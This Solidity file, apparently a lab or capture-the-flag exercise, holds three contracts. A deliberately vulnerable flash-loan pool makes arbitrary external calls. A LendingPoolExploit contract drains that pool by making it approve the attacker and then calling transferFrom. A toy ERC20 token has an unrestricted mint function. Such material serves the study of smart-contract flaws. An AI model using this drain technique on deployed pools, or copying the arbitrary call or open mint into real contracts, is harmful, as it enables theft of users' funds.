// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract LendingPoolExploit {
    IERC20 public token;
    LendingPool public pool;

    constructor(address _pool) {
        pool = LendingPool(_pool);
        token = pool.token();
    }

    function pwn() external {
        uint256 bal = token.balanceOf(address(pool));
        pool.flashLoan(
            0,
            address(token),
            abi.encodeWithSelector(token.approve.selector, address(this), bal)
        );
        token.transferFrom(address(pool), address(this), bal);
    }
}

contract LendingPool {
    IERC20 public token;

    constructor(address _token) {
        token = IERC20(_token);
    }

    function flashLoan(uint256 amount, address target, bytes calldata data)
        external
    {
        uint256 balBefore = token.balanceOf(address(this));
        require(balBefore >= amount, "borrow amount > balance");
        token.transfer(msg.sender, amount);
        (bool ok,) = target.call(data);
        require(ok, "loan failed");
        uint256 balAfter = token.balanceOf(address(this));
        require(balAfter >= balBefore, "balance after < before");
    }
}

contract SimpleERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;
    string public name = "SimpleToken";
    string public symbol = "ST";
    uint8 public decimals = 18;

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}
